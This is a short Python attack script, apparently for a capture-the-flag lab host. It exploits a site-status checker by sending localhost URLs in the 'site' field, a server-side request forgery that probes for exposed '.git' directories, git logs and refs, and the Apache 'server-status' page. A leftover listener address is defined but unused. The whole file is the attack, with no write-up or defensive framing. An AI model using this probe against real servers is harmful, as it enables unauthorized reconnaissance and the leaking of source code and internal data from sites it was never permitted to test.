import requests
from requests_toolbelt.utils import dump
from tqdm import tqdm

RHOST = 'http://10.10.11.177'
LHOST = 'http://10.10.16.5:9001'

file = 'dev/.git/config'
file = 'server-status'
file = 'dev/.git/'
file = 'dev/.git/branches/'
file = 'dev/.git/logs/HEAD'
file = 'dev/.git/logs/refs/heads/main'
file = 'dev/.git/logs/refs/heads/'
file = 'siteisup/.git'
data = {
    'site': 'http://localhost/' + file,
    'debug': '1'
}
r = requests.post(RHOST, data=data)
print(dump.dump_all(r).decode('utf-8'))
if '<font color=\'green\'>is up.' in r.text:
    print('[+] File found')
else:
    print('[!] File not found')
